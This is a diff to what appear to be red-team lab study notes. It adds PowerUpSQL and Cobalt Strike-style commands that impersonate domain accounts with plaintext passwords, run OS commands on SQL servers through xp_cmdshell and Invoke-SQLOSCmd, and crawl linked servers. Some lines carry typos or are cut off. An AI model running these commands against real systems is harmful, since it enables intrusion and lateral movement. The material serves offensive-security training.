@@ -23,3 +23,18 @@ Get-SQLServerLinkCrawl -verbose -instance "DESKTOP-4D21EQP\SQLEXPRESS" -username
 Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
 Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
 ```
+```
+make_token dev.zeropointsecurity.co.uk\bridgesb Scorpion!
+make_token cyberbotic.io\svc_mssql Cyberb0tic
+powershell Get-SQLQuery -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version'
+powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults 
+powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\Users\svc_mssql\Desktop' -RawResults 
+
+powerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
+powershell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
+powershelll Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | f
+111
+```
+
+
+
